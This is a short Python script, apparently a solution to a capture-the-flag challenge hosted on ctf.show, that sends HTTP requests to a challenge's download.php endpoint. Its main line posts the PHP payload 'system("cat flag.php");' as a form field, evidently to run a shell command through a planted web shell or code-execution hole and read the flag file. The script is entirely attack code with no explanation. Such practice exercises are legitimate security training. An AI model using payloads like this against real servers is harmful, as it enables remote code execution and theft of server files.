import requests


# url = 'http://a5138a0a-e793-4584-a3a9-846cf5610f89.chall.ctf.show/download.php?image=00fa48f4790616866858c46eb9d6c4f8.jpg'
# r = requests.get(url)
# print(r.text)


url = 'http://28abbea0-8b5f-4cb9-9e31-e2fc6f6bb6bd.chall.ctf.show/download.php?image=32c08c8665487f0fb3caf6f6bf6dd54d.jpg'
r = requests.post(url, data={'1': 'system("cat flag.php");'})
print(r.text)
